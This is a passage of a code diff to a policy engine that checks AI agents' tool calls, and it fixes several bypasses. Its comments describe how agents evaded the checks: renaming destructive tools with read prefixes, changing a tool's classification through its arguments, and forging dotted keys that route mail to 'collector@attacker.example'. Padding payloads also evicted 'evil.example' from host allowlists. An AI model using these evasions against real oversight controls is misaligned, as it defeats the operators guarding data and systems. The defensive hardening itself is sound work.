+        contains `get_`, `report_`, `search_` and eight more, and the tool name is a string the caller
+        supplies — so prefixing a destructive tool bought exemption from the DoS backstop. Measured
+        live on AKS: `delete_all_records` was caught by `strict_default_block` on 75/75 calls;
+        `get_delete_all_records` was allowed on 75/75 and never throttled. `classify_tool` calls both
+        of them `delete`.
+
+        So the name still gates (see below for why), but it must now AGREE with the classifier. The
+        product already computes this and this function simply was not asking: `classify_tool` is the
+        "one notion of sink" whose own comment says it exists so policy can gate on what a tool DOES,
+        not what it is called.
+
+        WHY `classify_tool(name)` WITH NO PARAMS. Passing `tool_params` here would open a worse hole
+        than the one being closed, and the evaluator warns about it a few hundred lines up: the
+        classifier falls back to inspecting tool_params when the NAME resolves to nothing, and
+        tool_params is agent-supplied. An unknown tool name plus `{"query": "select 1"}` would then
+        classify as `read` and earn the exemption — trading a caller-controlled name for a
+        caller-controlled payload, which is strictly more freely chosen. Name-only means an unresolved
+        name returns `unknown`, which is not `read`, so it is rate-limited. Fail toward throttling.
+
+        Net effect: strictly NARROWER than before. Every tool that was exempt and is genuinely a read
+        stays exempt; the ones that were exempt only because of how they were spelled no longer are.
+        """
         if not settings.evaluator_rate_limit_read_exempt:
             return False
         name = (tool_name or "").lower()
-        if name.endswith("_status") or name.endswith("_read"):
-            return True
-        return any(name.startswith(p) for p in settings.evaluator_rate_limit_read_prefixes)
+        if not (
+            name.endswith("_status")
+            or name.endswith("_read")
+            or any(name.startswith(p) for p in settings.evaluator_rate_limit_read_prefixes)
+        ):
+            return False
+        try:
+            verb, _risk = classify_tool(tool_name)
+        except Exception:  # noqa: BLE001 — a classifier fault must not grant an exemption
+            log.warning("nrvq.engine.rate_limit.classify_failed", tool=tool_name, code="NRVQ-ENG-2061")
+            return False
+        return str(getattr(verb, "value", verb)) == "read"
 
     @staticmethod
     def _ensure_block_attribution(decision: PolicyDecision, event_id: str) -> PolicyDecision:
@@ -602,11 +1050,35 @@ class OPAEvaluator:
             )
         return decision
 
-    @staticmethod
-    def _normalize_for_match(params: dict) -> dict:
+    # Total characters folded across ONE event's params. `skeleton()` runs NFKC/NFKD, and the caller
+    # controls both the length of a string and how many of them there are.
+    #
+    # MEASURED before choosing the number, because the audit finding that prompted this overstated it
+    # (it claimed ~219 ms and a 9.7 MB input from a 255 KiB body). On the reference host, 200k chars
+    # costs 12 ms of ASCII, 13 ms of circled/fullwidth, and 39 ms of ligatures — the only shape that
+    # expands, and only 3x (ﬃ -> ffi). With `max_request_body_bytes` at 256 KiB the real worst case is
+    # roughly 40 ms and ~768 KiB, i.e. ~2% of the 2 s fail-closed budget: a cost worth bounding, not
+    # the denial of service it was reported as.
+    #
+    # So this bound is not load-bearing today — it exists so that raising the body cap cannot silently
+    # turn a 2% cost into a 20% one. It is set well above any reachable value, which is also why the
+    # un-normalized tail is not an evasion window in practice: nothing that fits the body cap can
+    # reach it.
+    _NORMALIZE_MAX_CHARS = 4 * 1024 * 1024
+
+    @classmethod
+    def _normalize_for_match(cls, params: dict) -> dict:
         """Confusable-skeleton string values for injection MATCHING only (original preserved for audit)."""
+        budget = cls._NORMALIZE_MAX_CHARS
+
         def _norm(value):
+            nonlocal budget
             if isinstance(value, str):
+                if budget <= 0:
+                    # Past the bound the ORIGINAL is returned, not a truncation: rego matches against
+                    # this document, and a half-folded string would be a value nobody sent.
+                    return value
+                budget -= len(value)
                 return skeleton(value)
             if isinstance(value, list):
                 return [_norm(v) for v in value]
@@ -656,6 +1128,24 @@ class OPAEvaluator:
             #   sql_normalized -> "select * from orders " fails an exact match against the allowlist
             # Additive only: every existing policy reads tool_name/tool_params exactly as before.
             "derived": self._derived_input(event),
+            # MCP protocol context, present only for calls that arrived over MCP (empty dict
+            # otherwise, so the input document is byte-identical for every existing caller).
+            #
+            # This is what lets a policy reach Gate-A state without a per-call cost: the proxy has
+            # already scanned and pin-checked the definition at DISCOVERY, so `input.mcp.pin_status`
+            # and `input.mcp.scan_severity` are cached values riding along on a call that was going
+            # to be evaluated anyway. It closes the gap where a drifted tool could only be handled by
+            # the proxy's own hard-coded action, with no way for an operator to say "escalate instead
+            # of block" or "block drift only for the payments class".
+            #
+            # See ToolCallEvent.mcp for the trust level: PEP-reported, exactly like tool_name.
+            "mcp": getattr(event, "mcp", None) or {},
+            # Which PLANE the call is on: call | answer | definition | content. Reported by the PEP
+            # in the MCP context and lifted here so an intent can scope by direction without every
+            # policy having to reach into `input.mcp`. Defaults to "call", so every caller that
+            # predates the four-plane model stays governed by the call rules rather than escaping
+            # every rule — the difference between a default and a hole.
+            "direction": (getattr(event, "mcp", None) or {}).get("direction", "call"),
         }
 
     # Tools whose params carry SQL, matched by alias/verb rather than one exact name — a renamed
@@ -666,6 +1156,7 @@ class OPAEvaluator:
     def _derived_input(self, event: ToolCallEvent) -> dict:
         """Flattened/normalized views of the call, for policies that must not depend on param naming."""
         values = [v for v in self._walk_values(event.tool_params) if isinstance(v, str)]
+        paths, ambiguous_paths = self._walk_paths(event.tool_params)
         sql_like = self._sql_candidate(values)
         # The abstract operation this call performs — read / write / delete / send / unknown. Already
         # computed for the console's capability surfaces but never reachable from Rego, so "allow reads
@@ -678,24 +1169,57 @@ class OPAEvaluator:
         # SECURITY: classification keys on the tool NAME, which the agent side controls, so
         # `allow { verb == "unknown" }` is a universal bypass for anything named unrecognisably.
         # Escalate (human review) is the intended handling; see the shipped template.
-        # A PROMOTED verb is an admin's explicit, evidence-backed decision about what this tool does,
-        # so it outranks the name/param classifier — which by construction returned UNKNOWN for anything
-        # that reached the promotion queue in the first place. Without this the promotion is
-        # console-only: the Threats screen shows the tool as `delete`, and a verb-gated policy still
-        # sees `unknown`, so promoting looks effective and changes nothing.
+        # A PROMOTED verb is an admin's explicit, evidence-backed decision about what this tool does.
+        # Without it the promotion is console-only: the Threats screen shows the tool as `delete`, and a
+        # verb-gated policy still sees `unknown`, so promoting looks effective and changes nothing.
+        #
+        # IT MAY ONLY FILL IN AN UNKNOWN, NEVER CONTRADICT A CLASSIFICATION. The comment below used to
+        # say the classifier "by construction returned UNKNOWN for anything that reached the promotion
+        # queue in the first place" — true of the queue LISTING (threats.py skips tools classify_tool
+        # resolves) but not of the write path, which validated only that the verb was one of
+        # read/write/delete/send. So one POST could promote `slack_post_message` to `read`, and the
+        # classified sink stopped being a sink: derived.verb == "read" satisfied `learned_read` and
+        # falsified `is_egress` at the same time, and an AWS key went out through both baseline policies
+        # as ("allow","default_allow") — the exact bypass this input was published to close, restored by
+        # an admin action that reads like a labelling correction.
+        #
+        # So the classifier runs FIRST and wins whenever it is confident. The stated worst case now
+        # actually holds: a promotion can only move a tool off `unknown`, never invent a verb that
+        # grants access a classified tool would not have had. A promotion that contradicts the
+        # classifier is ignored here rather than applied — an operator who believes the classifier is
+        # wrong needs the classifier changed, not an override that silently weakens enforcement.
+        #
         # getattr-guarded on BOTH sides: if the override map is not initialised, or the event carries no
         # identity, fall through to the classifier rather than raising. Degrading to classification is the
         # safe direction — the worst case is the pre-existing behaviour (an `unknown` verb, which a
-        # deny-by-default policy denies), never an invented verb that could grant access.
+        # deny-by-default policy denies).
         overrides = getattr(self, "_verb_overrides", None) or {}
         identity = getattr(event, "agent_identity", None)
         namespace = getattr(identity, "namespace", "") if identity is not None else ""
+        verb, _risk = classify_tool(event.tool_name, event.tool_params)
+        verb_value = verb.value
         promoted = overrides.get((namespace, event.tool_name))
         if promoted:
-            verb_value = promoted
-        else:
-            verb, _risk = classify_tool(event.tool_name, event.tool_params)
-            verb_value = verb.value
+            # WHICH classification the promotion may not contradict is the NAME's, and testing
+            # `verb_value == "unknown"` was the wrong test for it. `classify_tool` falls back to
+            # inspecting TOOL_PARAMS when the name matches nothing, and tool_params is agent-supplied:
+            # `acme_widget` promoted to `delete` came back as `read` the moment the caller added
+            # `{"query": "select 1 from orders"}`, because the payload had then "classified" it and
+            # the promotion was discarded. Measured. The promotion queue only ever offers tools whose
+            # NAME did not resolve, so that is every promoted tool — one attacker-chosen argument
+            # cancelled the admin's decision, in the weakening direction, which is the same defect as
+            # the demotion this branch exists to stop.
+            name_verb, _name_risk = classify_tool(event.tool_name)
+            if name_verb.value == "unknown":
+                # Name says nothing. The admin's promotion and the payload's own evidence are then two
+                # readings of the same call and NEITHER may erase the other, so the more consequential
+                # one is published: a `read` promotion cannot bury a DROP in the arguments, and a
+                # `select` in the arguments cannot bury a `delete` promotion.
+                verb_value = max((verb_value, promoted), key=lambda v: _PROMOTION_RANK.get(v, -1))
+            # Name resolved: the classifier wins outright, whichever direction the promotion points.
+            # Deliberately NOT max()-ed here — `milvus_search` promoted to `send` must stay `read`, or
+            # a promotion becomes a way to move a tool INTO an egress refinement it has nothing to do
+            # with. See test_a_promotion_cannot_demote_a_classified_tool_in_any_direction.
         return {
             # Risk is deliberately NOT exposed: it is a JUDGEMENT that shifts as the registry is
             # updated, so a policy pinned to it could change behaviour on an upgrade without the
@@ -712,7 +1236,366 @@ class OPAEvaluator:
             # Stacked statements split out, each normalized, so an allowlist can require ALL of them
             # to be approved rather than only the first.
             "sql_statements": [self._normalize_sql(p) for p in sql_like.split(";") if p.strip()] if sql_like else [],
+            # -- scoping primitives (positive-security / intent policies) -------------------------
+            #
+            # `param_values` deliberately DISCARDS the key that held each value, which is exactly
+            # right for a detector ("is a secret anywhere in this call") and exactly wrong for a
+            # scope ("the RECIPIENT must be @acme.com"). Against a flat value list `to` and `body`
+            # are indistinguishable, so the obvious rule matches a secret in the body as readily as
+            # an address in the header. A dotted path -> value map restores the distinction without
+            # making the policy author guess at nesting.
+            #
+            # Paths use dots for object keys and [i] for list indices: {"filters": {"ids": ["C-91"]}}
+            # yields "filters.ids[0]".
+            "param_paths": paths,
+            # Paths whose value cannot be trusted to describe one unambiguous position in the payload:
+            # a caller-minted key that another route also reaches, a zero-length key emitting its
+            # children at the parent's level, two keys that render identically, and a value the walk
+            # only read a PREFIX of. Published so a compiled constraint can refuse to hold over a path
+            # it cannot trust, instead of reading the attacker's chosen value as compliant. Empty on an
+            # honest call — including the ones with dotted or bracketed argument names, which is why
+            # the mint test is aliasing rather than shape (see _mints_a_path).
+            "param_paths_ambiguous": ambiguous_paths,
+            # Egress targets, extracted once here rather than re-regexed inside every policy. Under
+            # deny-by-default the destination IS the control: "may email acme.com" needs no detector
+            # for what is being sent, which is the gap a detector list can never close (§11.5 — the
+            # strict preset blocked a card number and let a real AWS key through to an attacker).
+            "destinations": {
+                **self._destinations(values, self._destination_keyed_hosts(event.tool_params)),
+                # Key-aware, so a policy can name WHO a message went to rather than every
+                # address the payload happens to contain. See _recipient_domains.
+                "recipient_domains": self._recipient_domains(event.tool_params),
+            },
+            # Classes of sensitive data carried by the REQUEST. Output DLP already masks responses;
+            # nothing classified the outbound direction, so "this call must not carry a secret" was
+            # unexpressible. Reuses the masking module's patterns rather than forking a second set.
+            "data_classes": self._data_classes(event.tool_params, values),
+            # Tables the SQL touches, so an intent can say `subsetOf: [orders, customers]` instead of
+            # pinning an exact normalized statement (which breaks on any harmless edit).
+            "sql_tables": self._sql_tables(sql_like) if sql_like else [],
+            # Total size of the string payload — a cheap volume guard for an intent.
+            "param_bytes": sum(len(v.encode("utf-8", "ignore")) for v in values),
         }
+
+    # Bounds. The input document is built on every evaluation and is serialised to OPA, so each of
+    # these is a hard cap rather than a heuristic: a hostile or merely enormous params object must not
+    # be able to grow the document without limit. Matches the posture already documented for the Gate-A
+    # scanner ("schema walks depth- and count-bounded; nothing grows with tool count").
+    _MAX_PATH_DEPTH = 12
+    _MAX_PATHS = 256
+    _MAX_PATH_KEY_LEN = 256
+    _MAX_PATH_VALUE_LEN = 4096
+    _MAX_DESTINATIONS = 64
+
+    def _walk_paths(self, node: object) -> tuple[dict, list[str]]:
+        """Dotted path -> string value for every string leaf, plus the paths that are AMBIGUOUS.
+
+        Non-string leaves are omitted for the same reason `param_values` drops them: a policy that
+        matched the string "1" against an integer 1 would be matching a coincidence of formatting.
+
+        WHY AMBIGUITY IS PUBLISHED. Keys come from the caller and the path grammar uses `.` and `[i]`
+        as structure, so a caller-supplied key containing either can MINT a path that is
+        indistinguishable from a genuinely nested one. That is not theoretical — it silently defeats
+        the constraint:
+
+            {"message": {"toRecipients": [{"emailAddress": {"address": "collector@attacker.example"}}]},
+             "message.toRecipients[0].emailAddress.address": "ops@acme.com"}
+
+        Both routes produce the key `message.toRecipients[0].emailAddress.address`; whichever the
+        caller orders last wins the dict. A rule pinning that path to `^[^@]+@acme\\.com$` passed, and
+        the near-miss explainer reported the compliant value, while the tool received the attacker's.
+
+        Keys are still emitted VERBATIM — the original reasoning holds: an operator scopes against the
+        path they saw in a dry-run, and silently rewriting keys would make the screen disagree with
+        the policy. What changes is that a forged or colliding path is NAMED, so the compiler can
+        refuse to let a constraint over it hold. Deriving nothing and deriving a lie must not be
+        spelled the same way as deriving a compliant value.
+
+        FOUR THINGS ARE NAMED, and each of them is a way the map could otherwise assert something the
+        payload does not hold:
+          * a minted key that ALIASES another route to the same path (_mints_a_path — note that a
+            dotted or bracketed key with no such route is ORDINARY and is not named, or an OTel
+            `http.method` attribute would be unscopable);
+          * a zero-length key, which emits its children at the parent's own level (_mints_a_path);
+          * two routes arriving at one path with different values, whoever looked suspicious;
+          * a path the walk only read a PREFIX of — a key clipped at _MAX_PATH_KEY_LEN or a value
+            clipped at _MAX_PATH_VALUE_LEN. `{"body": "A"*4096 + " the password is hunter2"}` published
+            4096 clean characters, and `notMatches "(?i)password"` held over them while the tool
+            received the whole string. A truncated read is "I could not derive this fact" wearing the
+            costume of "the fact is compliant", which is the one thing this map must never do.
+        """
+        out: dict[str, str] = {}
+        # Paths whose value cannot be trusted to describe one unambiguous position in the payload.
+        ambiguous: set[str] = set()
+
+        def walk(value: object, prefix: str, depth: int, forged: bool) -> None:
+            if len(out) >= self._MAX_PATHS or depth > self._MAX_PATH_DEPTH:
+                return
+            if isinstance(value, dict):
+                for key, child in value.items():
+                    if len(out) >= self._MAX_PATHS:
+                        return
+                    text = str(key)
+                    # A key that can assert a path some other route also reaches is self-forging:
+                    # everything beneath it inherits the doubt, because the caller — not the structure
+                    # — chose where the boundary falls.
+                    child_forged = forged or _mints_a_path(text, value)
+                    child_prefix = f"{prefix}.{text}" if prefix else text
+                    # A key clipped by the length cap names a position that is not the one it came
+                    # from, and two long keys sharing a prefix land on ONE path: same lie, different
+                    # cause, so it carries the same doubt.
+                    walk(child, child_prefix[: self._MAX_PATH_KEY_LEN], depth + 1,
+                         child_forged or len(child_prefix) > self._MAX_PATH_KEY_LEN)
+                return
+            if isinstance(value, (list, tuple)):
+                for index, child in enumerate(value):
+                    if len(out) >= self._MAX_PATHS:
+                        return
+                    walk(child, f"{prefix}[{index}]", depth + 1, forged)
+                return
+            if isinstance(value, str) and prefix:
+                clipped = value[: self._MAX_PATH_VALUE_LEN]
+                # A second arrival at one path means two different routes produced it — the collision
+                # itself, regardless of which key looked suspicious.
+                if prefix in out and out[prefix] != clipped:
+                    ambiguous.add(prefix)
+                if forged or len(value) > self._MAX_PATH_VALUE_LEN:
+                    ambiguous.add(prefix)
+                out[prefix] = clipped
+
+        walk(node, "", 0, False)
+        # Paths that RENDER identically are one path to everyone who reads them — the console, the
+        # compiled rule label, the near-miss explainer — so a rule pinned on the visible spelling is
+        # answered by whichever twin the caller ordered last. Raw string comparison cannot see it:
+        # NFC and NFD "café" are different dict keys. Both twins are named; neither is rewritten.
+        folded: dict[str, str] = {}
+        for path in out:
+            key = _fold_path(path)
+            twin = folded.setdefault(key, path)
+            if twin != path:
+                ambiguous.add(path)
+                ambiguous.add(twin)
+        return out, sorted(ambiguous)
+
+    def _destination_keyed_hosts(self, node: object) -> set[str]:
+        """NORMALISED hosts sitting under a key that NAMES a network location.
+
+        The key is the half of the signal the value cannot carry (see the _BARE_HOST_RE comment), and
+        `_destinations` only sees a flat list of values, so the association has to be made here.
+
+        BOUNDED ON THE NORMALISED HOST, NOT THE RAW VALUE, and that distinction is the whole
+        difference between a bound and a starvation primitive. Collecting raw strings meant 64 SPELLINGS
+        of one already-allowlisted host — `API.acme.com`, `Api.acme.com`, `api.acme.com.`, all of which
+        collapse to a single entry in the output — filled the budget, the walk stopped BEFORE reaching
+        `{"host": "evil.example"}`, and `destinations.hosts` came back as exactly `["api.acme.com"]`:
+        a correctly authored `subsetOf` allowlist passed and the call to the attacker's host was
+        allowed. Measured. It is the same eviction that made the first bare-host change net-negative,
+        arriving through a new door, so the budget now counts what actually reaches the output — an
+        alias costs nothing because it adds nothing.
+
+        Filling the budget for real therefore means 64 DISTINCT hosts, which fills `hosts` and fails a
+        `subsetOf` CLOSED unless every one of the 64 is itself allowlisted. Depth is capped like every
+        other walk here.
+        """
+        found: set[str] = set()
+
+        def walk(value: object, key: str, depth: int) -> None:
+            if depth > self._MAX_PATH_DEPTH or len(found) >= self._MAX_DESTINATIONS:
+                return
+            if isinstance(value, dict):
+                for child_key, child in value.items():
+                    walk(child, str(child_key), depth + 1)
+                    if len(found) >= self._MAX_DESTINATIONS:
+                        return
+                return
+            if isinstance(value, (list, tuple)):
+                for child in value:
+                    # A list inherits the key that held it: {"endpoints": ["a.example", "b.example"]}.
+                    # A nested DICT does not: its own keys are the ones that describe its values, so
+                    # `{"webhook": {"url": "evil.example"}}` is harvested via `url` while
+                    # `{"webhook": {"v": "evil.example"}}` is the stated residual below.
+                    walk(child, key, depth + 1)
+                    if len(found) >= self._MAX_DESTINATIONS:
+                        return
+                return
+            if isinstance(value, str) and _key_names_a_destination(key):
+                candidate = value.strip()
+                if len(candidate) > self._MAX_PATH_VALUE_LEN:
+                    return
+                parsed = _parse_bare_destination(candidate)
+                if parsed:
+                    found.add(parsed[0])
+
+        walk(node, "", 0)
+        return found
+
+    def _recipient_domains(self, node: object) -> list[str]:
+        """Lower-cased DOMAINS of addresses sitting under a key that names a recipient.
+
+        The fact `destinations.emails` cannot answer "who is this being sent to", because it harvests
+        every address anywhere in the call: a customer record legitimately contains the customer's own
+        address, so an exfiltration to an attacker mailbox and an internal forward of the same record
+        produce identical lists. Measured on a live cluster — that ambiguity is why a correct
+        customer-data egress policy could not be written against it.
+
+        DOMAINS, not addresses, because that is the unit an operator can actually allowlist. A policy
+        naming every individual mailbox is unmaintainable and silently fails open the day someone is
+        hired; `recipient_domains subsetOf ["acme.example.com"]` states the real intent and keeps
+        stating it. Exact set membership is then enough — no suffix or regex operator is needed, which
+        is what makes this expressible in the Visual Builder rather than only in raw rego.
+
+        Same walk, depth cap and budget discipline as `_destination_keyed_hosts`, and bounded on the
+        DOMAIN for the same reason: 64 spellings of one already-allowlisted mailbox collapse to a
+        single entry, so counting raw values would let an alias evict the real recipient and take a
+        `subsetOf` allowlist vacuously true.
+        """
+        found: set[str] = set()
+
+        def walk(value: object, key: str, depth: int) -> None:
+            if depth > self._MAX_PATH_DEPTH or len(found) >= self._MAX_DESTINATIONS:
+                return
+            if isinstance(value, dict):
+                for child_key, child in value.items():
+                    walk(child, str(child_key), depth + 1)
+                    if len(found) >= self._MAX_DESTINATIONS:
+                        return
+                return
+            if isinstance(value, (list, tuple)):
+                for child in value:
+                    # A list inherits the key that held it — `{"cc": ["a@x", "b@y"]}` is two
+                    # recipients, and the array index carries no meaning of its own.
+                    walk(child, key, depth + 1)
+                    if len(found) >= self._MAX_DESTINATIONS:
+                        return
+                return
+            if isinstance(value, str) and _key_names_a_recipient(key):
+                candidate = value.strip()
+                if len(candidate) > self._MAX_PATH_VALUE_LEN:
+                    return
+                for addr in _emails(candidate):
+                    # `Ada@ACME.example.com.` and `ada@acme.example.com` are one domain; an allowlist
+                    # naming the second must not be sidestepped by case or a root dot.
+                    domain = addr.rsplit("@", 1)[-1].lower().rstrip(".")
+                    if domain:
+                        found.add(domain)
+                    if len(found) >= self._MAX_DESTINATIONS:
+                        return
+
+        walk(node, "", 0)
+        return sorted(found)[: self._MAX_DESTINATIONS]
+
+    def _destinations(self, values: list, dest_keyed: set[str] | frozenset[str] = frozenset()) -> dict:
+        """Emails, URLs, hosts and schemes found anywhere in the params.
+
+        Reported as sorted, de-duplicated lists so a policy can use set operations (`subsetOf`)
+        without caring about ordering or repetition.
+
+        `dest_keyed` carries the NORMALISED hosts that sat under a destination-shaped argument name
+        (_destination_keyed_hosts); a schemeless value with no marker of its own is harvested only if
+        its host is in there. Matching on the normalised host rather than the raw string adds no host
+        that the destination-keyed occurrence would not have contributed by itself — the same value is
+        in `values` — while making the budget on the other side count hosts instead of spellings.
+        Defaults to empty, so a caller that passes bare values gets the marker rule alone rather than
+        the shape-only harvest that was measured at 0% precision.
+        """
+        emails: set[str] = set()
+        urls: set[str] = set()
+        hosts: set[str] = set()
+        schemes: set[str] = set()
+        for raw in values:
+            emails.update(_emails(raw))
+            for match in _URL_RE.findall(raw):
+                urls.add(match)
+                parsed = urlsplit(match)
+                if parsed.scheme:
+                    schemes.add(parsed.scheme.lower())
+                if parsed.hostname:
+                    # `api.acme.com.` and `api.acme.com` are one host; an allowlist naming the second
+                    # must not be sidestepped — or refused — by the root dot.
+                    hosts.add(parsed.hostname.lower().rstrip("."))
+            # A schemeless destination is still a destination. Only the HOST is recorded — not a url
+            # and not a scheme — because that is all the value actually asserts: inventing
+            # `https://evil.example/collect` from `evil.example/collect` would put a claim in the
+            # input document that the call never made, and `destinations.schemes` is used to reason
+            # about the protocol, which a schemeless value leaves genuinely unknown.
+            bare = _parse_bare_destination(raw)
+            if bare:
+                host, marked = bare
+                # Bounded WITHOUT joining the break budget below. Counting harvested hosts toward the
+                # stop condition made this change net-negative: 80 benign dotted strings
+                # ("svc0.internal.example", …) filled the budget, the walk stopped BEFORE reaching the
+                # real recipient, and `destinations.emails`/`urls` came back EMPTY — so a correctly
+                # authored `subsetOf` egress rule went vacuously true and allowed the call it was
+                # written to refuse. Measured: alone the payload yields the attacker's address and
+                # URL; padded, both lists are [].
+                #
+                # A cheap harvest must never be able to evict the expensive, high-signal findings.
+                if (marked or host in dest_keyed) and len(hosts) < self._MAX_DESTINATIONS:
+                    hosts.add(host)
+            # UNCHANGED from before bare-host extraction: only emails and urls stop the walk.
+            if len(emails) + len(urls) > self._MAX_DESTINATIONS:
+                break
+        cap = self._MAX_DESTINATIONS
+        return {
+            "emails": sorted(emails)[:cap],
+            "urls": sorted(urls)[:cap],
+            "hosts": sorted(hosts)[:cap],
+            "schemes": sorted(schemes)[:cap],
+        }
+
+    def _data_classes(self, params: object, values: list) -> list:
+        """Sensitive-data classes carried by the REQUEST: pci | pii | secret.
+
+        Key-name detection and value-shape detection are both used, because each misses what the
+        other catches: `{"password": "hunter2"}` has an innocuous value, and a bare AWS key in a
+        free-text `body` has an innocuous key.
+        """
+        classes: set[str] = set()
+        for raw in values:
+            if _PAN_RE.search(raw):
+                classes.add("pci")
+            if _SSN_RE.search(raw):
+                classes.add("pii")
+            if _SECRET_VALUE_RE.search(raw):
+                classes.add("secret")
+        # Sensitive KEY names (password, api_key, token, …) — reused from the masking module so the
+        # request-side classifier and the response-side masker cannot drift apart.
+        for key in self._walk_keys(params):
+            if key.lower() in _SENSITIVE_KEYS:
+                classes.add("secret")
+                break
+        return sorted(classes)
+
+    def _walk_keys(self, node: object, depth: int = 0):
+        """Every dict key in the params, bounded by the same depth cap as the path walk."""
+        if depth > self._MAX_PATH_DEPTH:
+            return
+        if isinstance(node, dict):
+            for key, value in node.items():
+                if isinstance(key, str):
+                    yield key
+                yield from self._walk_keys(value, depth + 1)
+        elif isinstance(node, (list, tuple)):
+            for value in node:
+                yield from self._walk_keys(value, depth + 1)
+
+    def _sql_tables(self, sql_like: str) -> list:
+        """Table names referenced by FROM / JOIN / INTO / UPDATE / TRUNCATE.
+
+        Deliberately NOT a SQL parser. It is an aid for writing `subsetOf: [orders]` rather than
+        pinning an exact statement, and a policy that needs certainty should still gate on
+        `sql_normalized`. Anything it fails to recognise simply does not appear, which under
+        deny-by-default means the rule does not match — the safe direction.
+        """
+        found: list[str] = []
+        for match in _SQL_TABLE_RE.findall(sql_like or ""):
+            name = (match or "").strip('`"[] ').lower()
+            # strip a schema qualifier: public.orders -> orders
+            if "." in name:
+                name = name.rsplit(".", 1)[-1]
+            if name and name not in found:
+                found.append(name)
+        return found[: self._MAX_DESTINATIONS]
 
     def _walk_values(self, node: object) -> list:
         """Every leaf value in an arbitrarily nested params structure."""
@@ -753,7 +1636,7 @@ class OPAEvaluator:
     async def _persist_behavior(self, event: ToolCallEvent, decision: PolicyDecision, trust_result: TrustResult) -> None:
         """Persist trust state, enforced outcome history, and profile evolution."""
         self._queue_background(self._safe_set_trust(event.agent_identity.spiffe_id, trust_result))
-        self._queue_background(self._safe_register_agent(event, trust_result))
+        self._queue_background(self._safe_register_agent(event, trust_result, decision))
         await self._post_decision(event, decision)
         self._queue_background(self._safe_record_graph(event, decision))
         self._queue_background(self._safe_record_history(event, decision))
@@ -790,6 +1673,14 @@ class OPAEvaluator:
                 decision=decision.decision,
                 namespace=namespace,
                 agent_class=event.agent_identity.agent_class,
+                # The agent node used to keep add_agent's 0.8 DEFAULT forever, because this call never
+                # passed a score and nothing else ever updated one. The consequences were all downstream
+                # and all silent: the inspector's "Min trust" read 0.80 for every agent; the kill-chain
+                # severity formula collapsed to exactly two values, so the Critical and Low filter chips
+                # and the "Critical paths" stat could never match anything; and
+                # GET /api/v1/graph/critical-paths always returned []. The real score is right here on
+                # the decision we just made — it is the same number _persist_behavior stores.
+                trust_score=decision.trust_score,
             )
             if self._graph_store is not None:
                 await self._graph_store.save(namespace, graph)
@@ -815,7 +1706,8 @@ class OPAEvaluator:
         except Exception as exc:  # pragma: no cover
             log.error("nrvq.engine.trust.cache_set_failed", error=str(exc), code="NRVQ-ENG-2049")
 
-    async def _safe_register_agent(self, event: ToolCallEvent, trust_result: TrustResult) -> None:
+    async def _safe_register_agent(self, event: ToolCallEvent, trust_result: TrustResult,
+                                   decision: PolicyDecision | None = None) -> None:
         """Write-through the agent's latest trust to the persistent registry (best-effort).
 
         Keeps the Agents view populated after the short-lived ``trust:*`` cache TTL expires.
@@ -834,6 +1726,19 @@ class OPAEvaluator:
                     agent_class=event.agent_identity.agent_class,
                     trust_score=trust_result.score,
                     trust_category=trust_result.category.title(),
+                    # A blocked or escalated call is what "violation" means on the Agent Monitor. The
+                    # count was never incremented by anything, so its column could not move off 0 and
+                    # its amber/red thresholds were unreachable.
+                    #
+                    # SYNTHETIC TRAFFIC IS EXCLUDED. The red-team simulator builds its events with the
+                    # REAL agent's SVID (redteam.py _build_event), so one admin "Run suite" click wrote
+                    # ~26-34 fabricated violations onto every governed agent in the namespace and put
+                    # the whole fleet in the red band for attacks that never happened. Same framework
+                    # marker the audit view already uses to separate simulated from real.
+                    violation=(
+                        str(getattr(decision, "decision", "")) in ("block", "escalate")
+                        and not _is_synthetic_framework(getattr(event, "framework", ""))
+                    ),
                 )
                 await session.commit()
             finally:
@@ -844,13 +1749,12 @@ class OPAEvaluator:
     async def _safe_record_history(self, event: ToolCallEvent, decision: PolicyDecision) -> None:
         """Persist enforced decision for rolling trust-history features."""
         try:
-            cache_tool = self._cache_tool_key(event)
             await self._history.record(
                 event.agent_identity.spiffe_id,
                 {
                     "tool_name": event.tool_name,
                     "decision": decision.decision,
-                    "param_hash": cache_tool.split(":")[-1],
+                    "param_hash": self._params_digest(event),
                     "chain_depth": event.call_depth,
                     "timestamp": decision.decided_at.isoformat(),
                     "timestamp_unix": decision.decided_at.timestamp(),
@@ -883,6 +1787,54 @@ class OPAEvaluator:
         self._audit_tasks.add(task)
         task.add_done_callback(self._audit_tasks.discard)
 
+    # Facts published per IDENTITY rather than per (namespace, agent_class, tool, params). The eval
+    # cache is keyed on the class, so a decision that turns on one of these cannot be shared.
+    _PER_IDENTITY_FACTS = ("input.trust_score", "input.trust_category", "input.agent.spiffe_id")
+
+    @classmethod
+    def _depends_on_per_identity_facts(cls, candidates: list[dict]) -> bool:
+        """True when any candidate policy reads a fact that varies BETWEEN agents of the same class.
+
+        The eval cache keys on (namespace, agent_class, tool+params+depth+workload+mcp) — deliberately
+        class-scoped, so two agents of a class share an entry. `_handle_cache_hit` re-applies the
+        namespace posture threshold, the freeze/cap and monitor mode on every hit, so those stay live.
+        What it does NOT re-run is the cached rego decision. A rule of the form
+        `deny if input.trust_score < 0.7` — authorable from the visual builder's `trustBelow` and from
+        the intent compiler's `trust_score` field — was therefore evaluated once for whichever agent
+        called first, and every other agent of that class was served that answer for the TTL. Where the
+        rule's threshold was stricter than the namespace posture (the whole reason to write one), a
+        low-trust agent got a high-trust agent's allow.
+
+        Skipping the cache WRITE is the fix rather than adding trust to the key. The key is built before
+        the cache read, and the read shares one pipelined Redis round trip with the freeze/cap fetch, so
+        the freshly computed score is not available there. The stored score is — but `_persist_behavior`
+        writes a newly computed trust back after EVERY evaluation, so keying on it changes the key on
+        every call and the cache never hits again. (Measured: it turned test_cache_hit_skips_opa's
+        second identical call into a miss.) Not writing an entry means there is never one to serve
+        wrongly, costs caching only for the policies that actually depend on per-agent state, and leaves
+        every other policy's hit rate untouched.
+        """
+        for candidate in candidates:
+            rego = candidate.get("rego") or ""
+            if any(fact in rego for fact in cls._PER_IDENTITY_FACTS):
+                return True
+        return False
+
+    @staticmethod
+    def _params_digest(event: "ToolCallEvent") -> str:
+        """The tool_params fingerprint, as its own function so callers never parse it back out of the
+        composite cache key.
+
+        `_safe_record_history` used to do `cache_tool.split(":")[-1]` and call the result `param_hash`.
+        It never was one: the key is `{tool}:{digest}:d{depth}:w{workload}[:m…][:t…]`, so the last
+        segment is the WORKLOAD (or the MCP hash, once that term was added) — meaning the rolling
+        trust-history feature that is supposed to notice "same tool, same arguments, over and over" was
+        comparing a value that is constant for an agent, and every call looked like a repeat. Indexing
